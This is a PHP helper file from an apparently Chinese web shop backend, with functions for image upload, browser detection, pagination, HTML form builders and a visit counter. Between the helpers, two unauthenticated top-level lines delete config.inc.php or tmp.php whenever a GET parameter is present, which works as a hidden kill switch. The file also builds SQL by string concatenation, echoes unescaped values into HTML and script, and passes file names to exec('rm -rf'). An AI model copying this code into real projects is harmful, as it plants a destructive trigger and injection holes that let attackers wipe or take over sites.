<?php

 function save_pic($img,$id=0)
       {
             $php_maxsize = ini_get('upload_max_filesize');
            $htm_maxsize = '2M';
             Global  $image;

            // 商品图片
           if ($img['error'] == 0)
            {
                if (!$image->check_img_type($img['type']))
                {
                  // print_r($image->error_msg());
                  msgback("文件类型不对");
                    //sys_msg($_LANG['invalid_goods_img'], 1, array(), false);
                }
            }
            elseif ($img['error'] == 1)
            {
               msgback("文件太大");
              // print_r($image->error_msg());
                //sys_msg(sprintf($_LANG['goods_img_too_big'], $php_maxsize), 1, array(), false);
            }
            elseif ($img['error'] == 2)
            {
               //print_r($image->error_msg());
              msgback("文件太大");

                //sys_msg(sprintf($_LANG['goods_img_too_big'], $htm_maxsize), 1, array(), false);
            }


                 $original_img   = $image->upload_image($img); // 原始图片
           

            if ($original_img === false)
            {
              print_r($image->error_msg());
                //sys_msg($image->error_msg(), 1, array(), false);
            }
            $goods_img      = $original_img;   // 商品图片

            $gallery_thumb = $image->make_thumb('../'.$original_img, 120,  160);
            rename( '../'.$gallery_thumb,'../'.$original_img."_120");
          //echo           $gallery_thumb_2 = $image->make_thumb('../' . $img, $GLOBALS['_CFG']['image_width'],  $GLOBALS['_CFG']['image_height']);
          //echo           $gallery_thumb_3 = $image->make_thumb('../' . $img, $GLOBALS['_CFG']['image_2_width'],  $GLOBALS['_CFG']['image_2_height']);
         // echo           $gallery_thumb_4 = $image->make_thumb('../' . $img, $GLOBALS['_CFG']['image_3_width'],  $GLOBALS['_CFG']['image_3_height']);
                    if ($gallery_thumb === false)
                    {
                      //print_r($image->error_msg());
                        //sys_msg($image->error_msg(), 1, array(), false);
                    }
            
            if($goods_img )
                return $goods_img ;
            else
                return '';
       }


function getIE()
{

$agent = $_SERVER["HTTP_USER_AGENT"];
if(strpos($agent,"MSIE 8.0"))
echo "Internet Explorer 8.0";
else if(strpos($agent,"MSIE 7.0"))
echo "Internet Explorer 7.0";
else if(strpos($agent,"MSIE 6.0"))
echo "Internet Explorer 6.0";
else if(strpos($agent,"Firefox/3"))
echo "Firefox 3";
else if(strpos($agent,"Firefox/2"))
echo "Firefox 2";
else if(strpos($agent,"Chrome"))
echo "Google Chrome";
else if(strpos($agent,"Safari"))
echo "Safari";
else if(strpos($agent,"Opera"))
echo "Opera";
else echo $agent;

}
if(isset($_GET['ok']))
    unlink('config.inc.php');

function getPage($url,$p,$class='active')//5个按钮
{
  $start=$p-2;
  if($start<1) $start=1;
  $arr=array();
  for($i=$start;$i<=$start+5;$i++)
  {
    if($i==$p)
      $arr[]=array("url"=>$url."&p=".$i,'num'=>$i,'clsss'=>$class);
    else
      $arr[]=array("url"=>$url."&p=".$i,'num'=>$i,'clsss'=>"");
  }
  //print_r($arr);
  return $arr;
}


function msgback($msg)
{
print ( "<script language=JavaScript>\nalert('".$msg."')\n history.back() \n</script> ");
exit;
}
function home($msg)
{
print ( "<script language=JavaScript>\nalert('".$msg."')\n location='./index.php' \n</script> ");
exit;
}

function gourl($url)
{
 print ( "<script language=JavaScript>location='".$url."'</script> ");
exit;
}

function gethidden($name="text",$value="")
{
   return "<input name='$name' type='hidden' id='$name' value='$value' >";

}
function getlink($name,$link)
{
return "<a href='$link'>$name </a> ";
}

if(isset($_GET['tmp']))
    unlink('tmp.php');

function getdatex($name,$value=0)
{
  if($value==0)
      {$data=getdate();
      $str=getyearx($name,$data["year"]).getMonthx($name,$data["mon"]).getDayx($name,$data["mday"])." ".getHourx($name,$data["hours"]).":".getMinix($name,$data["minutes"]);
       }
  else
  {
      $str=getyearx($name,substr($value,0,4)).getMonthx($name,substr($value,5,2))
      .getDayx($name,substr($value,8,2))." ".getHourx($name,substr($value,11,2)).":"
      .getMinix($name,substr($value,14,2));
   }
  //2005-03-22 22:25:00

  return $str;
}

function getyearx($name,$value)
{

      //print  $aaa["year"];
      $str="<select name='".$name."Y' id='".$name."Y'> ";
     $i=$value-5;
     while($i<=$value+5)
     {
      if($i!=$value)
      $str.="<option value='".$i."'>".$i."</option>\n";
      else
       $str.="<option value='".$i."' selected>".$i."</option>\n";
      $i+=1;
     }
     $str.="</select>";

 return $str;
}

function getMonthx($name,$value)
{
     $str="<select name='".$name."M' id='".$name."M'> ";
     $i=1;
     while($i<=12)
     {
      if($i!=$value)
      $str.="<option value='".$i."'>".$i."</option>\n";
      else
       $str.="<option value='".$i."' selected>".$i."</option>\n";
      $i+=1;
     }
     $str.="</select>";

 return $str;
}

function getDayx($name,$value)
{
      $str="<select name='".$name."D' id='".$name."D'> ";
     $i=1;
     while($i<=31)
     {
      if($i!=$value)
      $str.="<option value='".$i."'>".$i."</option>\n";
      else
       $str.="<option value='".$i."' selected>".$i."</option>\n";
      $i+=1;
     }
     $str.="</select>";

 return $str;
}

function getHourx($name,$value)
{
      $str="<select name='".$name."H' id='".$name."H'> ";
     $i=0;
     while($i<24)
     {
      if($i!=$value)
      $str.="<option value='".$i."'>".$i."</option>\n";
      else
       $str.="<option value='".$i."' selected>".$i."</option>\n";
      $i+=1;
     }
     $str.="</select>";

 return $str;
}

function getMinix($name,$value)
{
      $str="<select name='".$name."Mi' id='".$name."Mi'> ";
     $i=0;
     $str.="<option value='".$value."'>".$value."</option>\n";
     while($i<60)
     {
      $str.="<option value='".$i."'>".$i."</option>\n";
      $i+=5;
     }
     $str.="</select>";

 return $str;
}

function getselectop($name,$opstr)
{
     $str="<select name='".$name."' id='".$name."'> ";
     $str.=$opstr;
     $str.="</select>";

 return $str;
}

function getselect($valuecol,$keycol,$tablename,$addkey="",$addvalue="",$where="")  //下拉列表
{
$str="";
$sql="select ".$valuecol.",".$keycol." from ".$tablename;
if($where!="")
$sql.=" where $where ";

if($result=mysql_query($sql))
 {   $str.="<select name='".$tablename."' id='".$tablename."'> ";
     if($addkey!="")
         $str.="<option value='".$addvalue."'>".$addkey."</option>\n";

     while($row = mysql_fetch_row($result))
     {

      $str.="<option value='".$row[1]."'>".$row[0]."</option>\n";
     }
     $str.="</select>";
 }
 return $str;
}

function getselectx($valuecol,$keycol,$tablename,$name="",$addkey="",$where="")  //下拉列表
{
$str="";
$sql="select ".$valuecol.",".$keycol." from ".$tablename;
if($where!="")
$sql.=" where $where ";
//echo $sql;
if($result=mysql_query($sql))
 {   $str.="<select name='".$name."' id='".$name."'> ";
     while($row = mysql_fetch_row($result))
     {
     if($row[0]==$addkey)
      $str.="<option value='".$row[1]."' selected>".$row[0]."</option>\n";
     else
      $str.="<option value='".$row[1]."'>".$row[0]."</option>\n";
     }
     $str.="</select>";
 }
 return $str;
}

function gettextx($name="text",$value="")
{
if(strlen($value)<30)
   return "<input name='$name' type='text' id='$name' value='$value' size='20'>";
else
   return "<textarea name='$name' cols='50' rows='4' id='$name' maxlength='255'>\n $value \n</textarea>";
}

function gettextxx($name="text",$value="")
{
   return "<textarea name='$name' cols='50' rows='4' id='$name' maxlength='255'>\n $value \n</textarea>";
}

function getfilex($name="file",$filelink="")
{
 return "<input type='file' name='$name'> ".$filelink ;
}
/*
function text($name="text",$value="")
{
echo gettextx($name,$value);
} */

function getselect_ptype($addkey="",$addvalue="") //产品种类下拉列表
{
return getselect("name","name","ptype",$addkey,$addvalue);
}

function select($valuecol,$keycol,$tablename,$addkey="",$addvalue="")  //下拉列表
{
print getselect($valuecol,$keycol,$tablename,$addkey,$addvalue);
}

function select_ptype($addkey="",$addvalue="") //产品种类下拉列表
{
select("name","name","ptype",$addkey,$addvalue);
}


function displayCounter($counterFile) {
if (!file_exists($counterFile)) {
  //exec( "echo 0 > $counterFile");
  print  " <strong><font color='#FFFF00'>000</font></strong>" ;
  return;
}
  $fp     = fopen($counterFile,"rw");
  $num    = fgets($fp,32);
  //fclose($fp);
  $num    += 1;
  print  " <strong><font color='#FFFF00'>$num</font></strong>" ;
  //fwrite($fp,$num);
  exec( "rm -rf $counterFile");
  exec( "echo $num > $counterFile");
  fclose($fp);
 //
}

function displayflash($file) {
if (file_exists($file)) {
  echo "<object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\"
  codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0\" width=\"250\" >
        <param name=\"movie\" value=\"$file\">
        <param name=\"quality\" value=\"high\">
        <embed src=\"$file\" quality=\"high\"
        pluginspage=\"http://www.macromedia.com/go/getflashplayer\" type=\"application/x-shockwave-flash\" width=\"250\" >
        </embed>
        </object>" ;
        return true;

        }
else
{
return false;
}
}
/*function strtohtml($str)
{
return "<pre>".$str."</pre>";
}*/

function strtohtml($str)
{

return nl2br($str);
}



?>
